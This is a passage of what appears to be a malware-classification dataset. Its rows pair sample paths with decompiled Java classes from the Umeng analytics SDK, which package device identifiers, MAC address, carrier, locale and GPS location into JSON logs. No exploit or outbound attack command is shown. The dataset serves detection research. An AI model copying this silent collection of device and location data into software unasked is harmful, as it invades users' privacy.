System.currentTimeMillis() / 1000;   }   private void c(  JSONObject jSONObject) throws JSONException {     for (    Map.Entry<String,String> entry : this.a.entrySet()) {       jSONObject.put(entry.getKey(),entry.getValue());     }   }   private void d(  JSONObject jSONObject) throws Exception {     jSONObject.remove(""id"");     jSONObject.remove(""ts"");     jSONObject.remove(""du"");     Iterator<String> keys=jSONObject.keys();     while (keys.hasNext()) {       String next=keys.next();       this.a.put(next,jSONObject.getString(next));     }   }   @Override public void a(  JSONObject jSONObject){     if (jSONObject != null) {       try {         this.b=jSONObject.getString(""id"");         this.c=jSONObject.getLong(""ts"");         if (jSONObject.has(""du"")) {           this.d=jSONObject.getLong(""du"");         }         d(jSONObject);       }  catch (      Exception e) {         e.printStackTrace();       }     }   }   @Override public void b(  JSONObject jSONObject) throws JSONException {     try {       jSONObject.put(""id"",this.b);       jSONObject.put(""ts"",this.c);       if (this.d > 0) {         jSONObject.put(""du"",this.d);       }       c(jSONObject);     }  catch (    Exception e) {       e.printStackTrace();     }   }   @Override public boolean a(){     if (this.b == null || this.c <= 0) {       Log.b(com.umeng.analytics.g.q,""mId or mTs is not initialized"");       return false;     }     if (this.a.isEmpty()) {       Log.b(com.umeng.analytics.g.q,""mCustomKV is not initialized"");       return false;     }     return true;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.analytics.a\b.code","public class b implements g {   public String a;   public ArrayList<a> b=new ArrayList<>();   public b(){   }   public b(  String str,  a aVar){     this.a=str;     this.b.add(aVar);   }   private void c(  JSONObject jSONObject) throws Exception {     if (jSONObject.length() != 0) {       this.a=jSONObject.keys().next();     }   }   private void d(  JSONObject jSONObject) throws Exception {     if (this.a != null) {       JSONArray jSONArray=jSONObject.getJSONArray(this.a);       for (int i=0; i < jSONArray.length(); i++) {         a aVar=new a();         aVar.a(jSONArray.getJSONObject(i));         this.b.add(aVar);       }     }   }   @Override public void a(  JSONObject jSONObject) throws Exception {     if (jSONObject != null) {       c(jSONObject);       d(jSONObject);     }   }   @Override public void b(  JSONObject jSONObject) throws Exception {     JSONArray jSONArray=new JSONArray();     Iterator<a> it=this.b.iterator();     while (it.hasNext()) {       jSONArray.put(new c(this,it.next()));     }     jSONObject.put(this.a,jSONArray);   }   @Override public boolean a(){     if (this.a == null || this.b.size() == 0) {       return false;     }     Iterator<a> it=this.b.iterator();     while (it.hasNext()) {       if (!it.next().a()) {         return false;       }     }     return true;   }   public void a(  b bVar){     this.b.addAll(bVar.b);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.analytics.a\c.code","class c extends JSONObject {   final a a;   final b b;   public c(  b bVar,  a aVar) throws JSONException {     this.b=bVar;     this.a=aVar;     this.a.b(this);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.analytics.a\d.code","public class d extends n implements g {   public String a;   private final String b=""context"";   public d(){   }   public d(  String str){     this.a=str;   }   public d(  Throwable th){     this.a=a(th);   }   private String a(  Throwable th){     String str=null;     if (th == null) {       return null;     }     try {       StringWriter stringWriter=new StringWriter();       PrintWriter printWriter=new PrintWriter(stringWriter);       th.printStackTrace(printWriter);       for (Throwable cause=th.getCause(); cause != null; cause=cause.getCause()) {         cause.printStackTrace(printWriter);       }       str=stringWriter.toString();       printWriter.close();       stringWriter.close();       return str;     }  catch (    Exception e) {       e.printStackTrace();       return str;     }   }   @Override public boolean a(){     if (this.a != null) {       return super.a();     }     Log.b(com.umeng.analytics.g.q,""mContent is not initialized"");     return false;   }   @Override public void a(  JSONObject jSONObject){     if (jSONObject != null) {       try {         this.g=jSONObject.getString(""date"");         this.h=jSONObject.getString(""time"");         this.a=jSONObject.getString(""context"");       }  catch (      Exception e) {         e.printStackTrace();       }     }   }   @Override public void b(  JSONObject jSONObject) throws Exception {     jSONObject.put(""date"",this.g);     jSONObject.put(""time"",this.h);     jSONObject.put(""context"",this.a);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.analytics.a\e.code","public class e extends l implements g {   public String a;   public String b;   public int c;   public long d;   private final String k=""tag"";   private final String l=""label"";   private final String m=""acc"";   private final String n=""du"";   public e(){   }   public e(  String str,  String str2,  String str3,  int i,  long j){     this.e=str;     this.a=str2;     this.b=str3;     this.c=i;     this.d=j;   }   @Override public boolean a(){     if (this.a == null) {       Log.b(com.umeng.analytics.g.q,""mTag is not initilized"");       return false;     }     if (this.c <= 0 || this.c > 10000) {       Log.b(com.umeng.analytics.g.q,""mAcc is invalid : "" + this.c);       return false;     }     return super.a();   }   @Override public void a(  JSONObject jSONObject){     if (jSONObject != null) {       try {         super.a(jSONObject);         this.a=jSONObject.getString(""tag"");         if (jSONObject.has(""label"")) {           this.b=jSONObject.getString(""label"");         }         this.c=jSONObject.getInt(""acc"");         if (jSONObject.has(""du"")) {           this.d=jSONObject.getLong(""du"");         }       }  catch (      Exception e) {         e.printStackTrace();       }     }   }   @Override public void b(  JSONObject jSONObject) throws Exception {     jSONObject.put(""tag"",this.a);     jSONObject.put(""acc"",this.c);     if (this.b != null) {       jSONObject.put(""label"",this.b);     }     if (this.d > 0) {       jSONObject.put(""du"",this.d);     }     super.b(jSONObject);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.analytics.a\f.code","public class f implements g {   public String A;   public String B;   public String C;   public String D;   public String E;   public String F;   public String a;   public String b;   public String c;   public String d;   public String e;   public long f;   public String g;   public String h;   public String i;   public String j;   public String k;   public String l;   public String m;   public String n;   public String o;   public long p;   public String q;   public String r;   public String s;   public String t;   public String u;   public String v;   public String w;   public String x;   public int y;   public String z;   private final String G=com.umeng.common.a.h;   private final String H=com.umeng.common.a.e;   private final String I=""device_id"";   private final String J=com.umeng.common.a.f;   private final String K=""mc"";   private final String L=com.umeng.analytics.g.H;   private final String M=""device_model"";   private final String N=""os"";   private final String O=""os_version"";   private final String P=""resolution"";   private final String Q=""cpu"";   private final String R=""gpu_vender"";   private final String S=""gpu_renderer"";   private final String T=""device_board"";   private final String U=""device_brand"";   private final String V=""device_manutime"";   private final String W=""device_manufacturer"";   private final String X=""device_manuid"";   private final String Y=""device_name"";   private final String Z=""app_version"";   private final String aa=com.umeng.common.a.g;   private final String ab=""package_name"";   private final String ac=""sdk_type"";   private final String ad=com.umeng.common.a.i;   private final String ae=""timezone"";   private final String af=""country"";   private final String ag=""language"";   private final String ah=""access"";   private final String ai=""access_subtype"";   private final String aj=""carrier"";   private final String ak=""wrapper_type"";   private final String al=""wrapper_version"";   public f(){   }   public f(  String str,  String str2){     this.a=str;     this.b=str2;   }   private void c(  JSONObject jSONObject) throws Exception {     this.a=jSONObject.getString(com.umeng.common.a.h);     this.c=jSONObject.getString(""device_id"");     this.d=jSONObject.getString(com.umeng.common.a.f);     if (jSONObject.has(""mc"")) {       this.e=jSONObject.getString(""mc"");     }     if (jSONObject.has(com.umeng.common.a.e)) {       this.b=jSONObject.getString(com.umeng.common.a.e);     }     if (jSONObject.has(com.umeng.analytics.g.H)) {       this.f=jSONObject.getLong(com.umeng.analytics.g.H);     }   }   private void d(  JSONObject jSONObject) throws Exception {     this.g=jSONObject.has(""device_model"") ? jSONObject.getString(""device_model"") : null;     this.h=jSONObject.has(""os"") ? jSONObject.getString(""os"") : null;     this.i=jSONObject.has(""os_version"") ? jSONObject.getString(""os_version"") : null;     this.j=jSONObject.has(""resolution"") ? jSONObject.getString(""resolution"") : null;     this.k=jSONObject.has(""cpu"") ? jSONObject.getString(""cpu"") : null;     this.l=jSONObject.has(""gpu_vender"") ? jSONObject.getString(""gpu_vender"") : null;     this.m=jSONObject.has(""gpu_renderer"") ? jSONObject.getString(""gpu_renderer"") : null;     this.n=jSONObject.has(""device_board"") ? jSONObject.getString(""device_board"") : null;     this.o=jSONObject.has(""device_brand"") ? jSONObject.getString(""device_brand"") : null;     this.p=jSONObject.has(""device_manutime"") ? jSONObject.getLong(""device_manutime"") : 0L;     this.q=jSONObject.has(""device_manufacturer"") ? jSONObject.getString(""device_manufacturer"") : null;     this.r=jSONObject.has(""device_manuid"") ? jSONObject.getString(""device_manuid"") : null;     this.s=jSONObject.has(""device_name"") ? jSONObject.getString(""device_name"") : null;   }   private void e(  JSONObject jSONObject) throws Exception {     this.t=jSONObject.has(""app_version"") ? jSONObject.getString(""app_version"") : null;     this.u=jSONObject.has(com.umeng.common.a.g) ? jSONObject.getString(com.umeng.common.a.g) : null;     this.v=jSONObject.has(""package_name"") ? jSONObject.getString(""package_name"") : null;   }   private void f(  JSONObject jSONObject) throws Exception {     this.w=jSONObject.getString(""sdk_type"");     this.x=jSONObject.getString(com.umeng.common.a.i);   }   private void g(  JSONObject jSONObject) throws Exception {     this.y=jSONObject.has(""timezone"") ? jSONObject.getInt(""timezone"") : 8;     this.z=jSONObject.has(""country"") ? jSONObject.getString(""country"") : null;     this.A=jSONObject.has(""language"") ? jSONObject.getString(""language"") : null;   }   private void h(  JSONObject jSONObject) throws Exception {     this.B=jSONObject.has(""access"") ? jSONObject.getString(""access"") : null;     this.C=jSONObject.has(""access_subtype"") ? jSONObject.getString(""access_subtype"") : null;     this.D=jSONObject.has(""carrier"") ? jSONObject.getString(""carrier"") : null;   }   private void i(  JSONObject jSONObject) throws Exception {     this.E=jSONObject.has(""wrapper_type"") ? jSONObject.getString(""wrapper_type"") : null;     this.F=jSONObject.has(""wrapper_version"") ? jSONObject.getString(""wrapper_version"") : null;   }   @Override public void a(  JSONObject jSONObject) throws Exception {     if (jSONObject != null) {       c(jSONObject);       d(jSONObject);       e(jSONObject);       f(jSONObject);       g(jSONObject);       h(jSONObject);       i(jSONObject);     }   }   private void j(  JSONObject jSONObject) throws Exception {     jSONObject.put(com.umeng.common.a.h,this.a);     jSONObject.put(""device_id"",this.c);     jSONObject.put(com.umeng.common.a.f,this.d);     if (this.b != null) {       jSONObject.put(com.umeng.common.a.e,this.b);     }     if (this.e != null) {       jSONObject.put(""mc"",this.e);     }     if (this.f > 0) {       jSONObject.put(com.umeng.analytics.g.H,this.f);     }   }   private void k(  JSONObject jSONObject) throws Exception {     if (this.g != null) {       jSONObject.put(""device_model"",this.g);     }     if (this.h != null) {       jSONObject.put(""os"",this.h);     }     if (this.i != null) {       jSONObject.put(""os_version"",this.i);     }     if (this.j != null) {       jSONObject.put(""resolution"",this.j);     }     if (this.k != null) {       jSONObject.put(""cpu"",this.k);     }     if (this.l != null) {       jSONObject.put(""gpu_vender"",this.l);     }     if (this.m != null) {       jSONObject.put(""gpu_vender"",this.m);     }     if (this.n != null) {       jSONObject.put(""device_board"",this.n);     }     if (this.o != null) {       jSONObject.put(""device_brand"",this.o);     }     if (this.p > 0) {       jSONObject.put(""device_manutime"",this.p);     }     if (this.q != null) {       jSONObject.put(""device_manufacturer"",this.q);     }     if (this.r != null) {       jSONObject.put(""device_manuid"",this.r);     }     if (this.s != null) {       jSONObject.put(""device_name"",this.s);     }   }   private void l(  JSONObject jSONObject) throws Exception {     if (this.t != null) {       jSONObject.put(""app_version"",this.t);     }     if (this.u != null) {       jSONObject.put(com.umeng.common.a.g,this.u);     }     if (this.v != null) {       jSONObject.put(""package_name"",this.v);     }   }   private void m(  JSONObject jSONObject) throws Exception {     jSONObject.put(""sdk_type"",this.w);     jSONObject.put(com.umeng.common.a.i,this.x);   }   private void n(  JSONObject jSONObject) throws Exception {     jSONObject.put(""timezone"",this.y);     if (this.z != null) {       jSONObject.put(""country"",this.z);     }     if (this.A != null) {       jSONObject.put(""language"",this.A);     }   }   private void o(  JSONObject jSONObject) throws Exception {     if (this.B != null) {       jSONObject.put(""access"",this.B);     }     if (this.C != null) {       jSONObject.put(""access_subtype"",this.C);     }     if (this.D != null) {       jSONObject.put(""carrier"",this.D);     }   }   private void p(  JSONObject jSONObject) throws Exception {     if (this.E != null) {       jSONObject.put(""wrapper_type"",this.E);     }     if (this.F != null) {       jSONObject.put(""wrapper_version"",this.F);     }   }   @Override public void b(  JSONObject jSONObject) throws Exception {     j(jSONObject);     k(jSONObject);     l(jSONObject);     m(jSONObject);     n(jSONObject);     o(jSONObject);     p(jSONObject);   }   @Override public boolean a(){     if (this.a == null) {       Log.e(com.umeng.analytics.g.q,""missing appkey "");       return false;     }     if (this.c == null || this.d == null) {       Log.e(com.umeng.analytics.g.q,""missing device id"");       return false;     }     return true;   }   public void a(  Context context,  String... strArr){     if (strArr != null && strArr.length == 2) {       this.a=strArr[0];       this.b=strArr[1];     }     if (this.a == null) {       this.a=com.umeng.common.b.q(context);     }     if (this.b == null) {       this.b=com.umeng.common.b.u(context);     }     this.c=com.umeng.common.b.g(context);     this.d=com.umeng.common.b.h(context);     this.e=com.umeng.common.b.r(context);     SharedPreferences c=com.umeng.analytics.j.c(context);     if (c != null) {       this.f=c.getLong(com.umeng.analytics.g.H,0L);     }   }   public void a(  Context context){     this.g=Build.MODEL;     this.h=""Android"";     this.i=Build.VERSION.RELEASE;     this.j=com.umeng.common.b.s(context);     this.k=com.umeng.common.b.a();     this.n=Build.BOARD;     this.o=Build.BRAND;     this.p=Build.TIME;     this.q=Build.MANUFACTURER;     this.r=Build.ID;     this.s=Build.DEVICE;   }   public void b(  Context context){     this.t=com.umeng.common.b.e(context);     this.u=com.umeng.common.b.d(context);     this.v=com.umeng.common.b.v(context);   }   public void c(  Context context){     this.w=""Android"";     this.x=com.umeng.analytics.g.c;   }   public void d(  Context context){     this.y=com.umeng.common.b.o(context);     String[] p=com.umeng.common.b.p(context);     this.z=p[0];     this.A=p[1];   }   public void e(  Context context){     String[] k=com.umeng.common.b.k(context);     this.B=k[0];     this.C=k[1];     this.D=com.umeng.common.b.t(context);   }   public void b(  Context context,  String... strArr){     a(context,strArr);     a(context);     b(context);     c(context);     d(context);     e(context);   }   public boolean b(){     return (this.a == null || this.c == null) ? false : true;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.analytics.a\g.code","public interface g {   void a(  JSONObject jSONObject) throws Exception ;   boolean a();   void b(  JSONObject jSONObject) throws Exception ; } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.analytics.a\h.code","public class h extends l implements g {   o a;   public h(){   }   public h(  Context context,  String str){     this.e=str;     this.a=o.a(context);   }   public void a(  o oVar){     this.a=oVar;   }   public void c(  JSONObject jSONObject) throws Exception {     if (this.a != null) {       this.a.b(jSONObject);     }   }   public void d(  JSONObject jSONObject) throws Exception {     o oVar=new o();     oVar.a(jSONObject);     if (oVar.a()) {       this.a=oVar;     }   }   @Override public boolean a(){     if (this.a == null && com.umeng.analytics.g.i) {       Log.c(com.umeng.analytics.g.q,""missing location info in Launch"");     }     return super.a();   }   @Override public void a(  JSONObject jSONObject){     if (jSONObject != null) {       try {         super.a(jSONObject);         d(jSONObject);       }  catch (      Exception e) {         e.printStackTrace();       }     }   }   @Override public void b(  JSONObject jSONObject) throws Exception {     c(jSONObject);     super.b(jSONObject);   }   public JSONObject b(){     JSONObject jSONObject;     Exception e;     try {       jSONObject=new JSONObject();     }  catch (    Exception e2) {       jSONObject=null;       e=e2;     }     try {       b(jSONObject);     }  catch (    Exception e3) {       e=e3;       e.printStackTrace();       return jSONObject;     }     return jSONObject;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.analytics.a\i.code","public class i implements g {   public ArrayList<g> a=new ArrayList<>();   public ArrayList<g> b=new ArrayList<>();   public ArrayList<g> c=new ArrayList<>();   public ArrayList<g> d=new ArrayList<>();   public ArrayList<g> e=new ArrayList<>();   private final String f=""launch"";   private final String g=""terminate"";   private final String h=""error"";   private final String i=""event"";   private final String j=""ekv"";   public void a(  h hVar){     if (hVar != null && hVar.a()) {       this.a.add(hVar);     }   }   public void a(  m mVar){     if (mVar != null && mVar.a()) {       this.b.add(mVar);     }   }   public void a(  d dVar){     if (dVar != null && dVar.a()) {       this.c.add(dVar);     }   }   public void a(  e eVar){     if (eVar != null && eVar.a()) {       this.d.add(eVar);     }   }   public void a(  String str,  a aVar){     if (aVar != null && aVar.a()) {       Iterator<g> it=this.e.iterator();       while (it.hasNext()) {         b bVar=(b)it.next();         if (bVar.a.equals(str)) {           bVar.b.add(aVar);           return;         }       }       this.e.add(new b(str,aVar));     }   }   public void a(  b bVar){     if (bVar != null && bVar.a()) {       this.e.add(bVar);     }   }   private void c(  JSONObject jSONObject) throws Exception {     if (jSONObject.has(""launch"")) {       JSONArray jSONArray=jSONObject.getJSONArray(""launch"");       for (int i=0; i < jSONArray.length(); i++) {         h hVar=new h();         hVar.a(jSONArray.getJSONObject(i));         a(hVar);       }     }   }   private void d(  JSONObject jSONObject) throws Exception {     if (jSONObject.has(""terminate"")) {       JSONArray jSONArray=jSONObject.getJSONArray(""terminate"");       for (int i=0; i < jSONArray.length(); i++) {         m mVar=new m();         mVar.a(jSONArray.getJSONObject(i));         a(mVar);       }     }   }   private void e(  JSONObject jSONObject) throws Exception {     if (jSONObject.has(""event"")) {       JSONArray jSONArray=jSONObject.getJSONArray(""event"");       for (int i=0; i < jSONArray.length(); i++) {         e eVar=new e();         eVar.a(jSONArray.getJSONObject(i));         a(eVar);       }     }   }   private void f(  JSONObject jSONObject) throws Exception {     if (jSONObject.has(""ekv"")) {       JSONArray jSONArray=jSONObject.getJSONArray(""ekv"");       for (int i=0; i < jSONArray.length(); i++) {         b bVar=new b();         bVar.a(jSONArray.getJSONObject(i));         a(bVar);       }     }   }   private void g(  JSONObject jSONObject) throws Exception {     if (jSONObject.has(""error"")) {       JSONArray jSONArray=jSONObject.getJSONArray(""error"");       for (int i=0; i < jSONArray.length(); i++) {         d dVar=new d();         dVar.a(jSONArray.getJSONObject(i));         a(dVar);       }     }   }   @Override public void a(  JSONObject jSONObject){     if (jSONObject != null) {       try {         c(jSONObject);         d(jSONObject);         e(jSONObject);         f(jSONObject);         g(jSONObject);       }  catch (      Exception e) {         Log.b(com.umeng.analytics.g.q,""merge log body eror"",e);       }     }   }   private JSONArray a(  ArrayList<g> arrayList){     JSONArray jSONArray;     j jVar;     if (arrayList.size() > 0) {       JSONArray jSONArray2=new JSONArray();       Iterator<g> it=arrayList.iterator();       j jVar2=null;       while (it.hasNext()) {         try {           jVar=new j(this,it.next());         }  catch (        Exception e) {           Log.a(com.umeng.analytics.g.q,""Fail to write json ..."",e);           jVar=jVar2;         }         if (jVar == null) {           jVar2=jVar;         }  else {           jSONArray2.put(jVar);           jVar2=jVar;         }       }       jSONArray=jSONArray2;     }  else {       jSONArray=null;     }     if (jSONArray == null || jSONArray.length() == 0) {       return null;     }     return jSONArray;   }   @Override public void b(  JSONObject jSONObject) throws Exception {     JSONArray a=a(this.a);     JSONArray a2=a(this.b);     JSONArray a3=a(this.d);     JSONArray a4=a(this.c);     JSONArray a5=a(this.e);     if (a != null) {       jSONObject.put(""launch"",a);     }     if (a2 != null) {       jSONObject.put(""terminate"",a2);     }     if (a3 != null) {       jSONObject.put(""event"",a3);     }     if (a4 != null) {       jSONObject.put(""error"",a4);     }     if (a5 != null) {       jSONObject.put(""ekv"",a5);     }   }   @Override public boolean a(){     Iterator<g> it=this.a.iterator();     while (it.hasNext()) {       if (!it.next().a()) {         return false;       }     }     Iterator<g> it2=this.b.iterator();     while (it2.hasNext()) {       if (!it2.next().a()) {         return false;       }     }     Iterator<g> it3=this.d.iterator();     while (it3.hasNext()) {       if (!it3.next().a()) {         return false;       }     }     Iterator<g> it4=this.e.iterator();     while (it4.hasNext()) {       if (!it4.next().a()) {         return false;       }     }     Iterator<g> it5=this.c.iterator();     while (it5.hasNext()) {       if (!it5.next().a()) {         return false;       }     }     return (this.a.size() == 0 && this.b.size() == 0 && this.d.size() == 0 && this.e.size() == 0 && this.c.size() == 0) ? false : true;   }   public void a(  i iVar){     this.a.addAll(iVar.a);     this.b.addAll(iVar.b);     this.d.addAll(iVar.d);     this.c.addAll(iVar.c);     b(iVar.e);   }   private void b(  ArrayList<g> arrayList){     if (!arrayList.isEmpty()) {       HashMap hashMap=new HashMap();       Iterator<g> it=arrayList.iterator();       while (it.hasNext()) {         b bVar=(b)it.next();         if (hashMap.containsKey(bVar.a)) {           ((b)hashMap.get(bVar.a)).a(bVar);         }  else {           hashMap.put(bVar.a,bVar);         }       }       Iterator<g> it2=this.e.iterator();       while (it2.hasNext()) {         b bVar2=(b)it2.next();         if (hashMap.containsKey(bVar2.a)) {           ((b)hashMap.get(bVar2.a)).a(bVar2);         }  else {           hashMap.put(bVar2.a,bVar2);         }       }       this.e.clear();       Iterator it3=hashMap.values().iterator();       while (it3.hasNext()) {         this.e.add((b)it3.next());       }     }   }   public int b(){     int i=0;     Iterator<g> it=this.e.iterator();     while (true) {       int i2=i;       if (it.hasNext()) {         i=((b)it.next()).b.size() + i2;       }  else {         return this.a.size() + i2 + this.b.size()+ this.d.size()+ this.c.size();       }     }   }   public void c(){     this.a.clear();     this.b.clear();     this.d.clear();     this.e.clear();     this.c.clear();   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.analytics.a\j.code","class j extends JSONObject {   final g a;   final i b;   public j(  i iVar,  g gVar) throws Exception {     this.b=iVar;     this.a=gVar;     this.a.b(this);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.analytics.a\k.code","public class k {   public String a;   public int b;   public k(){   }   public k(  JSONArray jSONArray) throws Exception {     this.a=jSONArray.getString(0);     this.b=jSONArray.getInt(1);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.analytics.a\l.code","public class l extends n {   public static final String f=""session_id"";   public String e;   public void a(  String str){     this.e=str;   }   @Override public boolean a(){     if (this.e != null) {       return super.a();     }     Log.b(com.umeng.analytics.g.q,""Session id is not initialized"");     return false;   }   @Override public void b(  JSONObject jSONObject) throws Exception {     super.b(jSONObject);     jSONObject.put(f,this.e);   }   @Override public void a(  JSONObject jSONObject) throws Exception {     super.a(jSONObject);     this.e=jSONObject.getString(f);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.analytics.a\m.code","public class m extends l implements g {   private static final String k=""duration"";   private static final String l=""activities"";   private static final String m=""terminate_time"";   public o a;   public p b;   public long c=0;   private ArrayList<k> d=new ArrayList<>();   public m(){   }   public m(  String str){     this.e=str;   }   public static m a(  Context context){     m mVar=null;     SharedPreferences e=com.umeng.analytics.j.e(context);     String string=e.getString(l.f,null);     if (string != null) {       mVar=new m(string);       o b=o.b(context);       if (b != null && b.a()) {         mVar.a=b;       }       p a=p.a(context);       if (a != null && a.a()) {         mVar.b=a;       }       mVar.d=c(e);       mVar.c=d(e);       String[] b2=b(e);       if (b2 != null && b2.length == 2) {         mVar.g=b2[0];         mVar.h=b2[1];       }       a(e);     }     return mVar;   }   private static void a(  SharedPreferences sharedPreferences){     SharedPreferences.Editor edit=sharedPreferences.edit();     edit.putLong(k,0L);     edit.putString(l,"""");     edit.commit();   }   private static String[] b(  SharedPreferences sharedPreferences){     long j=sharedPreferences.getLong(m,0L);     if (j <= 0) {       return null;     }     return com.umeng.common.b.a(new Date(j)).split("" "");   }   private static ArrayList<k> c(  SharedPreferences sharedPreferences){     String string=sharedPreferences.getString(l,"""");     if (!"""".equals(string)) {       ArrayList<k> arrayList=new ArrayList<>();       try {         String[] split=string.split("";"");         for (        String str : split) {           arrayList.add(new k(new JSONArray(str)));         }       }  catch (      Exception e) {         e.printStackTrace();       }       if (arrayList.size() > 0) {         return arrayList;       }     }     return null;   }   private static long d(  SharedPreferences sharedPreferences){     return sharedPreferences.getLong(k,0L) / 1000;   }   public static SharedPreferences.Editor a(  SharedPreferences sharedPreferences,  String str,  long j,  long j2){     long j3=j2 - j;     long j4=sharedPreferences.getLong(k,0L);     SharedPreferences.Editor edit=sharedPreferences.edit();     if (com.umeng.analytics.g.j) {       String string=sharedPreferences.getString(l,"""");       if (!"""".equals(string)) {         string=string + "";"";       }       String str2=string + String.format(""[\""%s\"",%d]"",str,Long.valueOf(j3 / 1000));       edit.remove(l);       edit.putString(l,str2);     }     edit.putLong(k,j3 + j4);     edit.putLong(m,j2);     edit.commit();     return edit;   }   public static SharedPreferences.Editor a(  SharedPreferences sharedPreferences,  ArrayList<com.umeng.analytics.f> arrayList,  long j,  long j2){     long j3=j2 - j;     long j4=sharedPreferences.getLong(k,0L);     SharedPreferences.Editor edit=sharedPreferences.edit();     if (arrayList.size() > 0) {       String string=sharedPreferences.getString(l,"""");       StringBuilder sb=new StringBuilder();       if (!TextUtils.isEmpty(string)) {         sb.append(string);         sb.append("";"");       }       Iterator<com.umeng.analytics.f> it=arrayList.iterator();       while (it.hasNext()) {         com.umeng.analytics.f next=it.next();         sb.append(String.format(""[\""%s\"",%d]"",next.a,Long.valueOf(next.b / 1000)));         sb.append("";"");       }       sb.deleteCharAt(sb.length() - 1);       edit.remove(l);       edit.putString(l,sb.toString());     }     edit.putLong(k,j3 + j4);     edit.putLong(m,j2);     edit.commit();     return edit;   }   @Override public boolean a(){     if (this.a == null && com.umeng.analytics.g.i) {       Log.c(com.umeng.analytics.g.q,""missing location info in Terminate"");     }     if (this.b == null) {       Log.e(com.umeng.analytics.g.q,""missing receive and transport Traffic in Terminate "");     }     if (this.c <= 0) {       Log.b(com.umeng.analytics.g.q,""missing Duration info in Terminate"");       return false;     }     if (this.d == null || this.d.size() == 0) {       Log.e(com.umeng.analytics.g.q,""missing Activities info in Terminate"");     }     return super.a();   }   private void c(  JSONObject jSONObject) throws Exception {     if (this.b != null) {       this.b.b(jSONObject);     }   }   private void d(  JSONObject jSONObject) throws Exception {     if (this.a != null) {       this.a.b(jSONObject);     }   }   private void e(  JSONObject jSONObject) throws Exception {     o oVar=new o();     oVar.a(jSONObject);     if (oVar.a()) {       this.a=oVar;     }   }   private void f(  JSONObject jSONObject) throws Exception {     p pVar=new p();     pVar.a(jSONObject);     if (pVar.a()) {       this.b=pVar;     }   }   private void g(  JSONObject jSONObject) throws Exception {     if (jSONObject.has(l)) {       JSONArray jSONArray=jSONObject.getJSONArray(l);       for (int i=0; i < jSONArray.length(); i++) {         this.d.add(new k(jSONArray.getJSONArray(i)));       }     }   }   private void h(  JSONObject jSONObject) throws Exception {     if (this.d.size() != 0) {       JSONArray jSONArray=new JSONArray();       Iterator<k> it=this.d.iterator();       while (it.hasNext()) {         k next=it.next();         JSONArray jSONArray2=new JSONArray();         jSONArray2.put(next.a);         jSONArray2.put(next.b);         jSONArray.put(jSONArray2);       }       jSONObject.put(l,jSONArray);     }   }   @Override public void a(  JSONObject jSONObject){     try {       super.a(jSONObject);       this.c=jSONObject.getLong(k);       f(jSONObject);       e(jSONObject);       g(jSONObject);     }  catch (    Exception e) {       e.printStackTrace();     }   }   @Override public void b(  JSONObject jSONObject) throws Exception {     super.b(jSONObject);     if (this.c > 0) {       jSONObject.put(k,this.c);     }     c(jSONObject);     d(jSONObject);     h(jSONObject);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.analytics.a\n.code","public class n {   public String g;   public String h;   protected final String i=""date"";   protected final String j=""time"";   public n(){     String a=com.umeng.common.util.h.a();     this.g=a.split("" "")[0];     this.h=a.split("" "")[1];   }   public boolean a(){     if (this.g != null && this.h != null) {       return true;     }     Log.b(com.umeng.analytics.g.q,""Date or Time is not initialized"");     return false;   }   public void b(  JSONObject jSONObject) throws Exception {     jSONObject.put(""date"",this.g);     jSONObject.put(""time"",this.h);   }   public void a(  JSONObject jSONObject) throws Exception {     this.g=jSONObject.getString(""date"");     this.h=jSONObject.getString(""time"");   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.analytics.a\o.code","public final class o implements g {   public static final String d=""lng"";   public static final String e=""lat"";   public static final String f=""gps_time"";   private static final String g=""last_gps_change_time"";   public double a;   public double b;   public long c;   public o(){   }   public o(  Location location){     if (location != null) {       this.a=location.getLongitude();       this.b=location.getLatitude();       this.c=location.getTime();     }   }   public static o a(  Context context){     if (!com.umeng.analytics.g.i) {       return null;     }     SharedPreferences e2=com.umeng.analytics.j.e(context);     Location m=com.umeng.common.b.m(context);     if (a(m,e2)) {       return new o(m);     }     return null;   }   public static o b(  Context context){     if (!com.umeng.analytics.g.i) {       return null;     }     SharedPreferences e2=com.umeng.analytics.j.e(context);     o oVar=new o();     if (!e2.contains(f)) {       return null;     }     oVar.b=e2.getFloat(e,0.0f);     oVar.a=e2.getFloat(d,0.0f);     oVar.c=e2.getLong(f,0L);     e2.edit().remove(f).commit();     return oVar;   }   public static SharedPreferences.Editor a(  Context context,  SharedPreferences sharedPreferences){     if (!com.umeng.analytics.g.i) {       return null;     }     Location m=com.umeng.common.b.m(context);     if (!a(m,sharedPreferences)) {       return null;     }     SharedPreferences.Editor edit=sharedPreferences.edit();     edit.putFloat(d,(float)m.getLongitude());     edit.putFloat(e,(float)m.getLatitude());     edit.putLong(f,m.getTime());     edit.commit();     return edit;   }   static boolean a(  Location location,  SharedPreferences 